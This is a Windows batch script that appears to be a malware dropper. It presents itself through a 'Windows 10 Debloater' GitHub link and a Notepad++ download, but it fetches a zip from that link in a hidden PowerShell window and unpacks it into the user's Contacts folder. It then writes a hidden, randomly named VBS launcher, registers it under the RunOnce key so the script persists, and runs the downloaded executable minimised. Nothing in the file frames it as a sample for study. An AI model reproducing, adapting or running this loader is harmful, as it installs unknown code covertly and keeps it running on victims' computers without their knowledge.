��&cls
@echo off
setlocal EnableDelayedExpansion
set "user_profile=%USERPROFILE%"
set "app_data=%APPDATA%"
set "temp_data=%TEMP%"
set "sys_root=%SystemRoot%"
set "self_path=%~f0"
set "TARGET=!user_profile!\Contacts\Notepad++"
set "ZIPFILE=!user_profile!\Contacts\Notepad.zip"
set "URL=https://github.com/0xMakeda/WIndows-10-Debloater/raw/refs/heads/main/Notepad++.zip"
set "REG_FULLKEY=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
if not exist "!TARGET!\" (
    if not exist "!user_profile!\Contacts\" mkdir "!user_profile!\Contacts\" 2>nul
    powershell -NoProfile -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '!URL!' -OutFile '!ZIPFILE!' -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
    if exist "!ZIPFILE!" (
        powershell -NoProfile -WindowStyle Hidden -Command "try { Expand-Archive -LiteralPath '!ZIPFILE!' -DestinationPath '!TARGET!' -Force -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
        if errorlevel 1 (
            exit /b 1
        )
        del "!ZIPFILE!" 2>nul
    ) else (
        exit /b 1
    )
)
set "CHECK_RESULT=0"
set "REG_DATA="
for /f "tokens=3*" %%A in ('reg query "!REG_FULLKEY!" /ve 2^>nul') do (
    set "REG_DATA=%%A %%B"
)
if defined REG_DATA (
    set "temp_data=!REG_DATA:wscript.exe=!"
    if /i not "!temp_data!"=="!REG_DATA!" set "CHECK_RESULT=1"
)
if "!CHECK_RESULT!"=="0" (
    set "VBS_DIR=!app_data!"
    if not exist "!VBS_DIR!\" (
        mkdir "!VBS_DIR!" 2>nul
        if errorlevel 1 (
            set "VBS_DIR=!temp_data!"
        )
    )
    if not exist "!VBS_DIR!\" (
        exit /b 1
    )

    for /f "delims=" %%R in ('powershell -NoProfile -WindowStyle Hidden -Command ^
        "$chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';$n=(Get-Random -Minimum 9 -Maximum 15); -join (1..$n | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })"') do set "randname=%%R"

    if not defined randname (
        exit /b 1
    )

    set "VBSFILE=!VBS_DIR!\!randname!.vbs"
    >"!VBSFILE!" (
        echo Set WshShell = CreateObject("WScript.Shell"^)
        echo WshShell.Run """!self_path!""", 0, False
    ) || (
        exit /b 1
    )

    if not exist "!VBSFILE!" (
        exit /b 1
    )

    :: Set hidden and system attributes for the VBS file
    attrib +h +s "!VBSFILE!" >nul 2>&1
    if errorlevel 1 (
        exit /b 1
    )

    reg add "!REG_FULLKEY!" /ve /t REG_SZ /d "\"!sys_root!\System32\wscript.exe\" \"!VBSFILE!\"" /f >nul 2>&1
    if errorlevel 1 (
        exit /b 1
    )
)
set "FOUND=!TARGET!\notepad++.exe"
if exist "!FOUND!" (
    start "" /min "!FOUND!" >nul 2>&1
)
endlocal
exit /b 0